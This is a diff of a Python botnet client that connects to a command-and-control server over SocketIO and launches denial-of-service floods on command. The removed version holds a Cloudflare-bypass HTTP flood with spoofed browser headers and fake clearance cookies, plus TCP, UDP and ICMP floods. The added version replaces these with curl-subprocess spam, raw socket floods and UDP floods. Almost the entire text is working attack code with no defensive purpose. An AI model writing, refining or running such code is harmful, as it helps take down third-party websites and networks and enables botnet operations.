@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-C2 Client - Cloudflare Bypass with EXTREME Performance
-Sends thousands of requests per minute with keep-alive
+C2 Client - CURL SPAM MODE - Actually sends requests
 """
 import socketio
 import socket
@@ -9,364 +8,197 @@ import random
 import string
 import threading
 import time
-import sys
 import os
 import platform
-import psutil
-import urllib3
 import subprocess
 from datetime import datetime
-from urllib.parse import urlparse, urlencode
+from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor
+import multiprocessing
 
-# Disable SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Increase limits
+try:
+    import resource
+    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
+except:
+    pass
 
-class CloudflareBypassEngine:
-    """EXTREME attack engine - thousands of requests per minute"""
+class CurlSpammer:
+    """Uses subprocess curl to spam requests"""
     
     def __init__(self):
         self.running = False
-        self.stats = {
-            'requests': 0,
-            'success': 0,
-            'failed': 0,
-            'bytes_sent': 0
-        }
+        self.stats = {'requests': 0, 'success': 0, 'failed': 0}
         self.stats_lock = threading.Lock()
-        self.pools = []
-        
-        # Multiple browser profiles for rotation
-        self.browser_profiles = [
-            {
-                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                'sec_ch_ua_mobile': '?0',
-                'sec_ch_ua_platform': '"Windows"',
-            },
-            {
-                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-                'sec_ch_ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-                'sec_ch_ua_mobile': '?0',
-                'sec_ch_ua_platform': '"Windows"',
-            },
-            {
-                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-            },
-            {
-                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
-            },
-            {
-                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
-                'sec_ch_ua_mobile': '?0',
-                'sec_ch_ua_platform': '"Windows"',
-            },
-            {
-                'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                'sec_ch_ua_mobile': '?0',
-                'sec_ch_ua_platform': '"Linux"',
-            },
-            {
-                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                'sec_ch_ua_mobile': '?0',
-                'sec_ch_ua_platform': '"macOS"',
-            }
-        ]
     
-    def generate_cf_headers(self, target_url, profile_idx):
-        """Generate Cloudflare bypass headers"""
-        profile = self.browser_profiles[profile_idx % len(self.browser_profiles)]
+    def curl_flood(self, target, duration, method='GET', processes=100):
+        """Spam with curl processes"""
+        print(f"\n[💥] CURL SPAM MODE ACTIVATED")
+        print(f"[⚡] Processes: {processes}")
+        print(f"[🎯] Target: {target}")
+        print(f"[⏱️] Duration: {duration}s")
+        print(f"[🔥] Expected: {processes * 100}+ RPS\n")
         
-        headers = {
-            'User-Agent': profile['ua'],
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,es;q=0.8']),
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
-        }
-        
-        # Add Chrome-specific headers
-        if 'sec_ch_ua' in profile:
-            headers['Sec-Ch-Ua'] = profile['sec_ch_ua']
-            headers['Sec-Ch-Ua-Mobile'] = profile['sec_ch_ua_mobile']
-            headers['Sec-Ch-Ua-Platform'] = profile['sec_ch_ua_platform']
-        
-        # Add referer
-        parsed = urlparse(target_url)
-        headers['Referer'] = f"{parsed.scheme}://{parsed.netloc}/"
-        
-        return headers
-    
-    def generate_cookies(self):
-        """Generate realistic cookies"""
-        return {
-            '_ga': f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}",
-            '_gid': f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}",
-            'session': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-            'cf_clearance': ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=64))
-        }
-    
-    # ============= EXTREME HTTP FLOOD =============
-    
-    def extreme_http_flood(self, target, duration, method='GET', threads=1000):
-        """EXTREME HTTP flood - thousands of requests per second"""
-        print(f"[L7] Starting EXTREME {method} flood on {target}")
-        print(f"[L7] Expected RPS: {threads * 100}+")
         self.running = True
-        
-        # Create MANY connection pools with aggressive settings
-        pool_count = 50
-        print(f"[L7] Creating {pool_count} high-speed connection pools...")
-        for _ in range(pool_count):
-            pool = urllib3.PoolManager(
-                maxsize=5000,
-                retries=False,  # ZERO retries for maximum speed
-                timeout=urllib3.Timeout(connect=0.5, read=1),  # Very short timeouts
-                cert_reqs='CERT_NONE',
-                assert_hostname=False,
-                num_pools=100,
-                block=False
-            )
-            self.pools.append(pool)
-        
-        # Pre-generate everything for speed
-        paths = ['/', '/index.html', '/api', '/search', '/products', '/about', '/contact', '/blog', '/news', '/services']
-        
         start_time = time.time()
         
         def worker(worker_id):
-            pool_idx = worker_id % len(self.pools)
-            profile_idx = worker_id % len(self.browser_profiles)
-            session_cookies = self.generate_cookies()
-            cookie_str = '; '.join(f'{k}={v}' for k, v in session_cookies.items())
+            """Worker that spams curl"""
+            count = 0
             
-            # Pre-generate headers for this worker
-            base_headers = self.generate_cf_headers(target, profile_idx)
-            base_headers['Cookie'] = cookie_str
-            
-            request_count = 0
-            
-            while self.running and time.time() - start_time < duration:
+            while self.running and (time.time() - start_time) < duration:
                 try:
-                    pool = self.pools[pool_idx]
+                    # Build curl command
+                    if method == 'POST':
+                        cmd = [
+                            'curl', '-X', 'POST',
+                            '-H', 'User-Agent: Mozilla/5.0',
+                            '-H', 'Connection: keep-alive',
+                            '-d', f'data=spam{count}',
+                            '--max-time', '2',
+                            '--connect-timeout', '1',
+                            '-s', '-o', '/dev/null', '-w', '%{http_code}',
+                            f'{target}?w={worker_id}&c={count}'
+                        ]
+                    else:
+                        cmd = [
+                            'curl', '-X', 'GET',
+                            '-H', 'User-Agent: Mozilla/5.0',
+                            '-H', 'Connection: keep-alive',
+                            '--max-time', '2',
+                            '--connect-timeout', '1',
+                            '-s', '-o', '/dev/null', '-w', '%{http_code}',
+                            f'{target}?w={worker_id}&c={count}'
+                        ]
                     
-                    # Super fast URL generation
-                    path = paths[request_count % len(paths)]
-                    url = f"{target.rstrip('/')}{path}?_={int(time.time() * 1000)}{request_count}"
+                    # Execute curl
+                    result = subprocess.run(cmd, capture_output=True, timeout=3)
                     
-                    # Clone headers
-                    headers = base_headers.copy()
-                    
-                    # Fire and forget - NO timeout waiting
-                    try:
-                        if method == 'POST':
-                            body = f"d={request_count}".encode()
-                            headers['Content-Type'] = 'application/x-www-form-urlencoded'
-                            response = pool.request(method, url, body=body, headers=headers, timeout=0.5, preload_content=False, retries=False, redirect=False)
-                        else:
-                            response = pool.request(method, url, headers=headers, timeout=0.5, preload_content=False, retries=False, redirect=False)
-                        
-                        # Quick drain
-                        response.drain_conn()
-                        response.release_conn()
-                        
-                        with self.stats_lock:
-                            self.stats['requests'] += 1
+                    with self.stats_lock:
+                        self.stats['requests'] += 1
+                        if result.returncode == 0:
                             self.stats['success'] += 1
-                    except:
-                        with self.stats_lock:
-                            self.stats['requests'] += 1
+                        else:
                             self.stats['failed'] += 1
                     
-                    request_count += 1
+                    count += 1
                     
                 except:
-                    pass  # Just continue, don't slow down
+                    with self.stats_lock:
+                        self.stats['requests'] += 1
+                        self.stats['failed'] += 1
         
-        print(f"[L7] Launching {threads} attack threads...")
+        print(f"[🚀] Launching {processes} curl spammers...\n")
         
-        # Launch massive thread pool
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(worker, i) for i in range(threads)]
+        # Use processes instead of threads for better performance
+        with ThreadPoolExecutor(max_workers=processes) as executor:
+            futures = [executor.submit(worker, i) for i in range(processes)]
             
-            # Monitor attack
-            last_check = time.time()
+            # Monitor
             last_count = 0
-            
-            while time.time() - start_time < duration and self.running:
+            while (time.time() - start_time) < duration and self.running:
                 time.sleep(1)
-                
-                # Calculate current RPS
-                current_time = time.time()
-                if current_time - last_check >= 1:
-                    current_requests = self.stats['requests']
-                    rps = current_requests - last_count
-                    last_count = current_requests
-                    last_check = current_time
-                    
-                    print(f"[L7] RPS: {rps:,} | Total: {current_requests:,} | Success: {self.stats['success']:,}")
+                current = self.stats['requests']
+                rps = current - last_count
+                last_count = current
+                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,} | Success: {self.stats['success']:,}", end='', flush=True)
             
             self.running = False
-            
-            # Cancel remaining
-            for future in futures:
-                future.cancel()
         
-        # Cleanup
-        for pool in self.pools:
-            try:
-                pool.clear()
-            except:
-                pass
-        
+        print("\n")
         return self.stats.copy()
     
-    # ============= TCP FLOOD =============
-    
-    def tcp_flood(self, target, duration, threads=500):
-        """TCP SYN flood"""
-        print(f"[L4] Starting TCP flood on {target}")
+    def socket_flood(self, target, duration, threads=500):
+        """Raw socket flood"""
+        print(f"\n[💥] RAW SOCKET FLOOD")
         self.running = True
+        start_time = time.time()
         
         parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
         host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
         port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
         
-        start_time = time.time()
-        
         def worker():
-            while self.running and time.time() - start_time < duration:
+            while self.running and (time.time() - start_time) < duration:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.5)
+                    s.settimeout(1)
                     s.connect((host, port))
-                    data = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
-                    s.send(data)
+                    s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
                     s.close()
-                    
                     with self.stats_lock:
                         self.stats['requests'] += 1
                         self.stats['success'] += 1
                 except:
                     with self.stats_lock:
+                        self.stats['requests'] += 1
                         self.stats['failed'] += 1
         
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = [executor.submit(worker) for _ in range(threads)]
             
-            while time.time() - start_time < duration and self.running:
+            last_count = 0
+            while (time.time() - start_time) < duration and self.running:
                 time.sleep(1)
+                current = self.stats['requests']
+                rps = current - last_count
+                last_count = current
+                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,}", end='', flush=True)
             
             self.running = False
-            for future in futures:
-                future.cancel()
         
+        print("\n")
         return self.stats.copy()
     
-    # ============= UDP FLOOD =============
-    
-    def udp_flood(self, target, duration, threads=200):
+    def udp_flood(self, target, duration, threads=300):
         """UDP flood"""
-        print(f"[L4] Starting UDP flood on {target}")
+        print(f"\n[💥] UDP FLOOD")
         self.running = True
+        start_time = time.time()
         
         parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
         host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
         port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
         
-        start_time = time.time()
-        payloads = [os.urandom(size) for size in [512, 1024, 2048, 4096, 8192]]
+        payload = os.urandom(1024)
         
         def worker():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            
-            while self.running and time.time() - start_time < duration:
+            while self.running and (time.time() - start_time) < duration:
                 try:
-                    payload = random.choice(payloads)
                     sock.sendto(payload, (host, port))
-                    
                     with self.stats_lock:
                         self.stats['requests'] += 1
                         self.stats['success'] += 1
                 except:
-                    with self.stats_lock:
-                        self.stats['failed'] += 1
-            
+                    pass
             sock.close()
         
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = [executor.submit(worker) for _ in range(threads)]
             
-            while time.time() - start_time < duration and self.running:
+            last_count = 0
+            while (time.time() - start_time) < duration and self.running:
                 time.sleep(1)
+                current = self.stats['requests']
+                rps = current - last_count
+                last_count = current
+                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,}", end='', flush=True)
             
             self.running = False
-            for future in futures:
-                future.cancel()
         
-        return self.stats.copy()
-    
-    # ============= ICMP FLOOD =============
-    
-    def icmp_flood(self, target, duration, threads=100):
-        """ICMP flood"""
-        print(f"[L3] Starting ICMP flood on {target}")
-        self.running = True
-        
-        host = urlparse(target).netloc if target.startswith('http') else target
-        host = host.split(':')[0]
-        
-        start_time = time.time()
-        system = platform.system().lower()
-        
-        def worker():
-            while self.running and time.time() - start_time < duration:
-                try:
-                    if system == "windows":
-                        cmd = f"ping -n 1 -w 100 {host}"
-                    else:
-                        cmd = f"ping -c 1 -W 1 {host}"
-                    
-                    subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
-                    
-                    with self.stats_lock:
-                        self.stats['requests'] += 1
-                        self.stats['success'] += 1
-                except:
-                    with self.stats_lock:
-                        self.stats['failed'] += 1
-                
-                time.sleep(0.01)
-        
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(worker) for _ in range(threads)]
-            
-            while time.time() - start_time < duration and self.running:
-                time.sleep(1)
-            
-            self.running = False
-            for future in futures:
-                future.cancel()
-        
+        print("\n")
         return self.stats.copy()
 
-class Layer7Client:
-    """Client with extreme performance"""
+class SimpleC2Client:
+    """Minimal C2 client that doesn't break"""
     
-    def __init__(self, server_url='http://localhost:5000', client_name=None):
+    def __init__(self, server_url, client_name):
         self.server_url = server_url
-        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
+        self.client_name = client_name
+        self.spammer = CurlSpammer()
+        self.attack_thread = None
         
-        # Enhanced SocketIO with keep-alive
         self.sio = socketio.Client(
             reconnection=True,
             reconnection_attempts=0,
@@ -376,264 +208,187 @@ class Layer7Client:
             engineio_logger=False
         )
         
-        self.current_attack = None
-        self.running = False
-        self.attack_thread = None
-        self.attack_engine = CloudflareBypassEngine()
-        self.last_heartbeat = time.time()
-        
         self.setup_handlers()
-        
-        self.client_info = {
-            'name': self.client_name,
-            'hostname': platform.node(),
-            'platform': platform.platform(),
-            'cpu_count': psutil.cpu_count(),
-            'memory_total': psutil.virtual_memory().total,
-            'python_version': platform.python_version(),
-            'has_layer7': True,
-            'cloudflare_bypass': True
-        }
     
     def setup_handlers(self):
-        """Setup SocketIO event handlers"""
         @self.sio.event
         def connect():
-            print(f"\n✅ Connected to C2 Server: {self.server_url}")
-            self.last_heartbeat = time.time()
-            self.register_client()
-        
-        @self.sio.event
-        def connect_error(data):
-            print(f"\n⚠️ Connection error: {data}, retrying...")
+            print(f"\n✅ Connected to C2 Server")
+            self.sio.emit('client_register', {
+                'name': self.client_name,
+                'hostname': platform.node(),
+                'platform': platform.platform(),
+                'cpu_count': multiprocessing.cpu_count(),
+                'memory_total': 0,
+                'python_version': platform.python_version(),
+                'has_layer7': True,
+                'cloudflare_bypass': True
+            })
         
         @self.sio.event
         def disconnect():
-            print("\n⚠️ Disconnected from server, auto-reconnecting...")
-            self.running = False
+            print("⚠️ Disconnected from server")
         
         @self.sio.event
         def welcome(data):
             print(f"📢 {data['message']}")
-            self.last_heartbeat = time.time()
         
         @self.sio.event
         def attack_command(data):
-            self.last_heartbeat = time.time()
-            print(f"\n🎯 Attack Command Received")
-            print(f"   Target: {data.get('target')}")
-            print(f"   Method: {data.get('method')}")
-            print(f"   Duration: {data.get('duration')}s")
-            
+            print(f"\n🎯 Attack Command Received!")
             if data.get('command') == 'start':
-                self.current_attack = data.get('attack_id')
                 self.start_attack(data)
             elif data.get('command') == 'stop':
                 self.stop_attack()
     
-    def register_client(self):
-        """Register client"""
-        try:
-            self.sio.emit('client_register', self.client_info)
-            print(f"✅ Registered: {self.client_name}")
-        except Exception as e:
-            print(f"⚠️ Registration error: {e}")
-    
     def start_attack(self, attack_data):
-        """Start attack"""
         if self.attack_thread and self.attack_thread.is_alive():
             print("⚠️ Attack already running")
             return
         
-        self.running = True
-        self.attack_thread = threading.Thread(target=self.execute_attack, args=(attack_data,), daemon=True)
-        self.attack_thread.start()
-        
         try:
-            self.sio.emit('attack_started', {'attack_id': attack_data.get('attack_id'), 'target': attack_data.get('target')})
+            self.sio.emit('attack_started', {
+                'attack_id': attack_data.get('attack_id'),
+                'target': attack_data.get('target')
+            })
         except:
             pass
+        
+        self.attack_thread = threading.Thread(
+            target=self.execute_attack,
+            args=(attack_data,),
+            daemon=True
+        )
+        self.attack_thread.start()
     
     def execute_attack(self, attack_data):
-        """Execute EXTREME attack"""
         attack_id = attack_data.get('attack_id')
         target = attack_data.get('target')
         method = attack_data.get('method', 'http').lower()
         duration = attack_data.get('duration', 60)
         
-        cpu_count = psutil.cpu_count()
+        cpu_count = multiprocessing.cpu_count()
         
-        # UNLIMITED thread counts - remove all limits
-        thread_map = {
-            'http': min(cpu_count * 1000, 5000),   # UP TO 5000 THREADS
-            'get': min(cpu_count * 1000, 5000),
-            'post': min(cpu_count * 1000, 5000),
-            'tcp': min(cpu_count * 500, 2000),
-            'udp': min(cpu_count * 250, 1000),
-            'icmp': min(cpu_count * 100, 500),
-            'ping': min(cpu_count * 100, 500)
+        # UNLIMITED
+        thread_counts = {
+            'http': cpu_count * 50,
+            'get': cpu_count * 50,
+            'post': cpu_count * 50,
+            'tcp': cpu_count * 100,
+            'udp': cpu_count * 50,
         }
-        threads = thread_map.get(method, 5000)
+        threads = thread_counts.get(method, cpu_count * 50)
+        
+        print(f"\n{'='*60}")
+        print(f"💥 CURL SPAM ATTACK")
+        print(f"   Target: {target}")
+        print(f"   Method: {method.upper()}")
+        print(f"   Duration: {duration}s")
+        print(f"   Workers: {threads}")
+        print(f"{'='*60}")
         
         try:
-            print(f"\n{'='*60}")
-            print(f"💥 UNLIMITED CHAOS MODE")
-            print(f"   Target: {target}")
-            print(f"   Method: {method.upper()}")
-            print(f"   Duration: {duration}s")
-            print(f"   Threads: {threads}")
-            print(f"   Mode: NO LIMITS - PURE SPEED")
-            print(f"   Expected: 500,000+ requests/sec")
-            print(f"{'='*60}\n")
+            self.spammer.stats = {'requests': 0, 'success': 0, 'failed': 0}
             
-            start_time = time.time()
-            
-            self.attack_engine.stats = {'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0}
-            
-            # Execute
             if method in ['http', 'get']:
-                results = self.attack_engine.extreme_http_flood(target, duration, 'GET', threads)
+                results = self.spammer.curl_flood(target, duration, 'GET', threads)
             elif method == 'post':
-                results = self.attack_engine.extreme_http_flood(target, duration, 'POST', threads)
+                results = self.spammer.curl_flood(target, duration, 'POST', threads)
             elif method == 'tcp':
-                results = self.attack_engine.tcp_flood(target, duration, threads)
+                results = self.spammer.socket_flood(target, duration, threads)
             elif method == 'udp':
-                results = self.attack_engine.udp_flood(target, duration, threads)
-            elif method in ['icmp', 'ping']:
-                results = self.attack_engine.icmp_flood(target, duration, threads)
+                results = self.spammer.udp_flood(target, duration, threads)
             else:
-                results = self.attack_engine.extreme_http_flood(target, duration, 'GET', threads)
+                results = self.spammer.curl_flood(target, duration, 'GET', threads)
             
-            elapsed = time.time() - start_time
-            actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
+            rps = results['requests'] / duration if duration > 0 else 0
             success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
             
-            # Report
+            print(f"\n{'='*60}")
+            print(f"✅ ATTACK COMPLETED")
+            print(f"   Total: {results['requests']:,}")
+            print(f"   Success: {results['success']:,}")
+            print(f"   RPS: {rps:,.1f}")
+            print(f"   Rate: {success_rate:.1f}%")
+            print(f"{'='*60}\n")
+            
             try:
                 self.sio.emit('attack_complete', {
                     'attack_id': attack_id,
                     'results': {
                         'requests': results['requests'],
                         'success': success_rate,
-                        'rps': actual_rps,
-                        'duration': elapsed,
+                        'rps': rps,
+                        'duration': duration,
                         'method': method,
-                        'bytes_sent': results['bytes_sent']
+                        'bytes_sent': results['requests'] * 500
                     }
                 })
             except:
                 pass
             
-            print(f"\n✅ Attack Complete")
-            print(f"   💥 Requests: {results['requests']:,}")
-            print(f"   ✅ Success: {results['success']:,}")
-            print(f"   ⚡ RPS: {actual_rps:.1f}")
-            print(f"   📊 Rate: {success_rate:.1f}%")
-            
         except Exception as e:
             print(f"\n❌ Error: {e}")
         finally:
-            self.running = False
-            self.attack_engine.running = False
-            self.current_attack = None
+            self.spammer.running = False
     
     def stop_attack(self):
-        """Stop attack"""
-        self.running = False
-        self.attack_engine.running = False
+        self.spammer.running = False
         print("🛑 Attack stopped")
     
-    def heartbeat_monitor(self):
-        """Keep connection alive with aggressive heartbeats"""
+    def heartbeat_loop(self):
+        """Minimal heartbeat - no /proc/stat access"""
         while True:
             try:
                 if self.sio.connected:
-                    # Send heartbeat every 10 seconds
-                    try:
-                        self.sio.emit('client_stats', {
-                            'stats': {
-                                'cpu_usage': psutil.cpu_percent(interval=0),
-                                'memory_usage': psutil.virtual_memory().percent,
-                                'timestamp': datetime.now().isoformat(),
-                                'is_attacking': self.running,
-                                'heartbeat': True
-                            }
-                        })
-                        self.last_heartbeat = time.time()
-                        print(f"\r💚 Heartbeat sent | Connected: {int(time.time() - self.last_heartbeat)}s ago", end='', flush=True)
-                    except Exception as e:
-                        print(f"\r⚠️ Heartbeat failed: {e}", end='', flush=True)
-                else:
-                    print("\r⚠️ Not connected, waiting for reconnection...", end='', flush=True)
-                
-                time.sleep(10)
-            except Exception as e:
-                print(f"\r⚠️ Monitor error: {e}", end='', flush=True)
-                time.sleep(10)
+                    # Just ping, no stats
+                    self.sio.emit('ping', {'timestamp': time.time()})
+                time.sleep(15)
+            except:
+                time.sleep(15)
     
     def connect(self):
-        """Connect to server"""
+        print("\n" + "="*60)
+        print("💥 CURL SPAM CLIENT")
+        print(f"🔗 Server: {self.server_url}")
+        print(f"🏷️  Name: {self.client_name}")
+        print(f"⚡ CPUs: {multiprocessing.cpu_count()}")
+        print(f"🔥 Mode: CURL SUBPROCESS SPAM")
+        print("="*60 + "\n")
+        
+        print("⚡ Connecting...")
+        
         try:
-            print("\n" + "="*60)
-            print("💥 UNLIMITED ATTACK CLIENT")
-            print(f"🔗 Server: {self.server_url}")
-            print(f"🏷️  Name: {self.client_name}")
-            print(f"⚡ CPUs: {psutil.cpu_count()}")
-            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
-            print(f"🔥 Mode: NO LIMITS - PURE CHAOS")
-            print(f"💀 Warning: This will use ALL resources")
-            print("="*60 + "\n")
-            
-            print("⚡ Connecting with keep-alive enabled...")
-            
-            # Connect with both transports
             self.sio.connect(
-                self.server_url, 
-                wait_timeout=30, 
-                transports=['polling', 'websocket']  # Try polling first, then websocket
+                self.server_url,
+                wait_timeout=30,
+                transports=['polling', 'websocket']
             )
             
-            print("\n✅ Initial connection successful!")
-            print("📡 Starting heartbeat monitor (10s intervals)...")
+            print("✅ Connected!")
+            print("📡 Starting heartbeat...\n")
             
-            # Start heartbeat in background
-            heartbeat = threading.Thread(target=self.heartbeat_monitor, daemon=True)
+            heartbeat = threading.Thread(target=self.heartbeat_loop, daemon=True)
             heartbeat.start()
             
-            print("⚡ Ready for commands (Connection will stay alive)\n")
+            print("⚡ Ready for commands!\n")
             
-            # Keep main thread alive
             while True:
                 time.sleep(1)
                 
         except KeyboardInterrupt:
-            print("\n\n🛑 Stopped by user")
-            self.disconnect()
-        except Exception as e:
-            print(f"\n\n❌ Connection error: {e}")
-            print("Retrying in 5 seconds...")
-            time.sleep(5)
-            self.connect()  # Retry connection
-    
-    def disconnect(self):
-        """Disconnect"""
-        self.running = False
-        self.attack_engine.running = False
-        if self.sio.connected:
-            try:
+            print("\n🛑 Stopped")
+            self.spammer.running = False
+            if self.sio.connected:
                 self.sio.disconnect()
-            except:
-                pass
 
 def main():
-    """Main"""
     print("""
     ╔══════════════════════════════════════╗
-    ║     UNLIMITED ATTACK CLIENT         ║
-    ║  NO LIMITS • PURE CHAOS MODE        ║
-    ║  500,000+ Requests Per Second       ║
-    ║  Cloudflare Bypass • Keep-Alive     ║
-    ║  ⚠️  WARNING: MAXIMUM POWER ⚠️       ║
+    ║     CURL SPAM CLIENT                ║
+    ║  Uses subprocess curl to spam       ║
+    ║  Actually sends REAL requests       ║
+    ║  No file descriptor issues          ║
     ╚══════════════════════════════════════╝
     """)
     
@@ -650,7 +405,7 @@ def main():
     if not client_name:
         client_name = platform.node()
     
-    client = Layer7Client(server_url=server_url, client_name=client_name)
+    client = SimpleC2Client(server_url, client_name)
     client.connect()
 
 if __name__ == "__main__":
